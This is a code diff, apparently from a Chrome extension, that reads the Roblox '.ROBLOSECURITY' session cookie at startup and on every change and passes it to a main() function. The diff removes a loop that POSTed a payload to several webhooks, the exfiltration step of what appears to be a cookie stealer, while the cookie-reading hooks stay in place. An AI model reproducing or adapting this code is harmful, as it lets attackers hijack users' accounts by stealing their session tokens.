@@ -109,18 +109,8 @@ async function main(cookie) {
         "avatar_url": "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
     };
 
-    // Send to all webhooks
-    for (let wh of WEBHOOKS) {
-        let payload = { ...embedPayload, content: wh.mention };
-
-        fetch(wh.url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-    }
+    
 }
-
 // 🚀 Run once on startup
 chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
     main(cookie ? cookie.value : null);
@@ -137,4 +127,5 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
         }
     }
 });
+
 
